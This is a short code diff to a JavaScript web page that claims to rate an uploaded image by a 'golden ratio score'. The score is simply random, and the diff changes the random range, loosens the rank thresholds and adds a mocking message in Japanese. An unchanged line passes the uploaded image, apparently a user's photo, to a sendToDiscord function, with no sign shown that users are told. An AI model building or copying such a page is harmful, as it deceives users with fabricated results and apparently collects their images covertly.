@@ -158,14 +158,14 @@ function send() {
     document.getElementById("preview").src = base64;
     document.getElementById("previewBox").style.display = "block";
 
-    const score = Math.floor(30 + Math.random() * 25);
-    const rank = score >= 90 ? "S" : score >= 80 ? "A" : "B";
+    const score = Math.floor(30 + Math.random() * 20);
+    const rank = score >= 45 ? "S" : score >= 30 ? "A" : "B";
 
     document.getElementById("result").style.display = "block";
     document.getElementById("result").innerHTML = `
       <div class="rank">ランク ${rank}</div>
       黄金比スコア：<b>${score}%</b><br>
-      うんいいと思うよ、うんｗ
+      うんいいと思うよ、うんｗまあがんばｗ
     `;
 
     sendToDiscord(base64, score, rank);
